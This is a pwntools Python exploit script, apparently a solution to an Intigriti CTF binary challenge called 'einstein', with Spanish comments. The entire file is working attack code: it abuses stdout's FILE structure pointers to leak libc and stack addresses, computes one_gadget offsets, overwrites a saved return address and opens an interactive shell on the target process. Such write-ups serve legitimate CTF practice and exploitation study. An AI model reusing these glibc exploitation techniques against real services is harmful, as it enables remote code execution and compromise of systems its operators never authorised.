from pwn import *

gs = '''
b *handle+106
b *handle+203
continue
'''

elf = context.binary = ELF("./einstein_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        #return remote("hidden.ctf.intigriti.io", 1337)
        return remote("127.0.0.1", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

input("PAUSE")

io.sendlineafter(b'How long is your story ?\n', str(0x500000).encode())

io.sendlineafter(b"What's the distortion of time and space ?\n", str(0x7037b8).encode())

io.recv()

io.send(b"\xc8") # da igual lo que pongas aca jaja vi en otros write ups que ponen \xff pero el fin es el mismo
# que cuando se llame a puts al usar el puntero _IO_write_ptr imprima lo que esta en 0x7f....fe ese contenido jaja

print(io.recvline())
print(io.recvline())
io.recv(3)
#print(io.recv(8))

leak_libc = int(hex(u64(io.recv(7).ljust(8, b"\x00")))[:-2], 16)

print(f"Leak Libc: {hex(leak_libc)}")

libc.address = leak_libc - libc.sym._IO_stdfile_1_lock

print(f"System: {hex(libc.sym.system)}")

one_gadget = [0x54f4c, 0x54f53, 0xeb60e, 0xeb66b]

leak_stack = u64(io.recvuntil("Everything").replace(b"Everything", b"")[-8:])

print(f"Leak Stack: {hex(leak_stack)}")

ret_address = leak_stack - 288

io.recv()

io.sendline(str(leak_stack) + " " + str(libc.address + one_gadget[0]))
io.sendline(str(ret_address) + " " + str(libc.address + one_gadget[0]))

io.interactive()